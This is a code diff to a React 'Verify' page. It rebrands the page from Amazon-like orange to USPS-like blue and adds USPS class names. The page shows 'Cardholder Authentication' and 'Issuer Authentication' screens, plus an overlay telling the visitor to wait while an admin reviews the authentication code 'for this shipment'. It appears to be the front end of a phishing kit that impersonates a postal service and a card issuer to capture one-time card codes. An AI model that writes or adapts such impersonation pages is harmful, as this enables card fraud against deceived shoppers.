@@ -255,21 +255,21 @@ export default function Verify() {
   };
 
   return (
-    <div className="alz-page w-full text-slate-900 relative overflow-hidden">
+    <div className="alz-page alz-usps-page w-full text-slate-900 relative overflow-hidden">
       {waitingForAdmin && (
         <div className="absolute inset-0 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
-            <div className="mx-auto h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
+            <div className="mx-auto h-10 w-10 rounded-full border-4 border-[#ccd7ef] border-t-[#2f67b3] animate-spin" />
             <div className="mt-4 text-lg font-semibold text-slate-900">Checking your code</div>
             <div className="text-sm text-slate-600 mt-2">Please wait while we review the authentication code for this shipment.</div>
-            <div className="mt-5 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-800">Do not refresh or close this page while authentication is pending.</div>
+            <div className="mt-5 rounded-lg border border-[#d7e0f2] bg-[#f4f7fd] px-3 py-2 text-xs text-[#314a73]">Do not refresh or close this page while authentication is pending.</div>
           </div>
         </div>
       )}
 
       {showMethodPicker && !waitingForAdmin && (
         <div className="absolute inset-0 bg-slate-900/55 backdrop-blur-sm flex items-center justify-center z-40 p-4">
-          <div className="alz-bank-picker">
+          <div className="alz-bank-picker alz-usps-bank-picker">
             <div className="alz-bank-picker-head">
               <div>
                 <div className="alz-bank-picker-eyebrow">Cardholder Authentication</div>
@@ -304,9 +304,9 @@ export default function Verify() {
         </div>
       )}
 
-      <div className="alz-shell relative z-10">
+      <div className="alz-shell relative z-10 alz-usps-form-shell">
         <div className="alz-bank-shell">
-          <div className="alz-bank-frame">
+          <div className="alz-bank-frame alz-usps-bank-frame">
             <div className="alz-bank-header">
               <div>
                 <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
